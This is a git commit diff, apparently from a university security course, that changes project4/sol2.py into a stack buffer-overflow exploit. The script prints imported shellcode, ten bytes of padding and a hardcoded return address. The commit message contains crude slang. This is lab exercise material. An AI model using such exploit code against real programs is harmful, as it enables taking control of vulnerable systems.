79c8606d8315c199202b1bc8daceb5d605db3a79
Trever Cullen <trevercullen@gmail.com>
2017-03-22 21:58:49 -0400

    sol2 nicca

--- project4/sol2.py
+++ project4/sol2.py
@@ -3,7 +3,5 @@
 from struct import pack
 from shellcode import shellcode
 
-addr = pack("<I", 0x804889c)
-# print("A"*16 + addr)
-
-print shellcode
+addr = pack("<I", 0xbffff9fa)
+print(shellcode + "A"*10 + addr)
